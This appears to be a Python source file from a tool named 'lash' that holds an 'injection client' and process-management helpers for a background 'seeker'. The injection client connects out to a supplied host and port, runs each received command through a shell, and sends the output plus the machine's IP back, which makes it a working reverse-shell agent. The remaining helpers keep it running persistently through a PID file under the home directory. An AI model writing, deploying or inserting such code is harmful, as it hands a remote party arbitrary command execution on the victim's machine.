import os
import signal
import socket
import subprocess
from pathlib import Path

from lash.plugins.server.helpers import send_msg, recv_msg


def port_verify(port: str) -> int:
    try:
        return int(port)
    except ValueError:
        raise ValueError(f"Invalid port [{port}], must be an integer like 8080")


def run_injection_client(host: str, port: int) -> None:
    local_ip = socket.gethostbyname(socket.gethostname())
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        welcome = recv_msg(s)
        if "lash" not in welcome:
            return
        while True:
            try:
                msg = recv_msg(s)
            except (ConnectionError, OSError):
                break
            if msg.get("type") != "cmd":
                continue
            result = subprocess.run(
                msg["data"], shell=True, capture_output=True, text=True
            )
            output = result.stdout + result.stderr
            send_msg(s, {"type": "result", "data": output, "addr": local_ip})


def seeker_pid_path() -> Path:
    return Path.home() / ".lash" / "seeker.pid"


def seeker_log_path() -> Path:
    return Path.home() / ".lash" / "seeker.log"


def write_pid(pid: int) -> None:
    p = seeker_pid_path()
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(str(pid))


def read_pid() -> int | None:
    p = seeker_pid_path()
    if not p.exists():
        return None
    try:
        return int(p.read_text().strip())
    except ValueError:
        return None


def is_pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except (OSError, ProcessLookupError):
        return False
